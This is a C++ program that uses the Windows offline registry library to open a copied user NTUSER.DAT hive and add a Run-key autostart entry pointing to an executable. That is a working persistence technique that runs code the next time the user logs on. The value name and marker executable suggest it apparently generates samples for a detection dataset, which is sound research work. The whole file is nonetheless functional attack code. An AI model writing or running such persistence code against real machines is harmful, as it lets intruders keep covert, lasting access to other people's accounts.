// Registry Persistence via Hive Save/Restore
#include <windows.h>
#include <iostream>
#include <string>

// FIX: Declare OROpenHive instead of ORCreateHive to parse the copied user file
typedef DWORD(WINAPI *pfnOROpenHive)(LPCWSTR lpszFilePath, HKEY *phkResult);
typedef DWORD(WINAPI *pfnORCreateKey)(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpClass, DWORD dwOptions, PSECURITY_DESCRIPTOR pSecurityDescriptor, HKEY *phkResult, PDWORD pdwDisposition);
typedef DWORD(WINAPI *pfnORSetValue)(HKEY hKey, LPCWSTR lpValueName, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef DWORD(WINAPI *pfnORSaveHive)(HKEY hKey, LPCWSTR lpszFilePath, DWORD dwOsMajorVersion, DWORD dwOsMinorVersion);
typedef DWORD(WINAPI *pfnORCloseKey)(HKEY hKey);

int main()
{
    // Define the path where you copied the logged-out user's hive file
    std::wstring targetHivePath = L"C:\\Users\\Public\\NTUSER.DAT";
    std::wstring runKeyName = L"Dataset_A06_1b_OfflineHiveSaveRestore_Persistence";
    std::wstring payloadCommand = L"C:\\Users\\Public\\A06_1b_persistence_marker.exe";
    std::wstring runKeySubPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    std::wcout << L"[*] Loading offreg.dll to perform offline hive manipulation...\n";

    // 1. Dynamically load the offline registry helper library
    HMODULE hOffReg = LoadLibraryW(L"offreg.dll");
    if (!hOffReg)
    {
        std::wcerr << L"[-] Failed to load offreg.dll. Ensure it is in your execution directory.\n";
        return 1;
    }

    // Resolve needed function addresses (Updated to map OROpenHive)
    auto OROpenHive = (pfnOROpenHive)GetProcAddress(hOffReg, "OROpenHive");
    auto ORCreateKey = (pfnORCreateKey)GetProcAddress(hOffReg, "ORCreateKey");
    auto ORSetValue = (pfnORSetValue)GetProcAddress(hOffReg, "ORSetValue");
    auto ORSaveHive = (pfnORSaveHive)GetProcAddress(hOffReg, "ORSaveHive");
    auto ORCloseKey = (pfnORCloseKey)GetProcAddress(hOffReg, "ORCloseKey");

    if (!OROpenHive || !ORCreateKey || !ORSetValue || !ORSaveHive || !ORCloseKey)
    {
        std::wcerr << L"[-] Failed to map offreg.dll functions.\n";
        FreeLibrary(hOffReg);
        return 1;
    }

    HKEY hRootKey = nullptr;
    HKEY hRunKey = nullptr;
    DWORD dwDisposition = 0;

    // 2. FIX: Open the actual valid copied user hive file from disk
    DWORD result = OROpenHive(targetHivePath.c_str(), &hRootKey);
    if (result != ERROR_SUCCESS)
    {
        std::wcerr << L"[-] OROpenHive failed. Ensure the file exists and is not locked. Error code: " << result << std::endl;
        FreeLibrary(hOffReg);
        return 1;
    }

    // 3. Create or open the registry path inside our offline file structure
    result = ORCreateKey(hRootKey, runKeySubPath.c_str(), nullptr, 0, nullptr, &hRunKey, &dwDisposition);
    if (result == ERROR_SUCCESS)
    {
        // Calculate total string size including the null terminator
        DWORD cbData = static_cast<DWORD>((payloadCommand.length() + 1) * sizeof(wchar_t));

        // 4. Inject the persistence values into the memory-mapped file structure
        result = ORSetValue(hRunKey, runKeyName.c_str(), REG_SZ, reinterpret_cast<const BYTE *>(payloadCommand.c_str()), cbData);
        if (result != ERROR_SUCCESS)
        {
            std::wcerr << L"[-] ORSetValue failed with error code: " << result << std::endl;
        }
        else
        {
            // 5. Serialize the modified structure back into the binary file on disk
            result = ORSaveHive(hRootKey, targetHivePath.c_str(), 6, 2);
            if (result != ERROR_SUCCESS)
            {
                std::wcerr << L"[-] ORSaveHive failed with error code: " << result << std::endl;
            }
            else
            {
                std::wcout << L"[+] Successfully created persistence inside offline hive at: " << targetHivePath << std::endl;
            }
        }
    }
    else
    {
        std::wcerr << L"[-] ORCreateKey failed with error code: " << result << std::endl;
    }

    // Clean up handles and resources safely
    if (hRunKey)
        ORCloseKey(hRunKey);
    if (hRootKey)
        ORCloseKey(hRootKey);
    FreeLibrary(hOffReg);

    return result == ERROR_SUCCESS ? 0 : 1;
}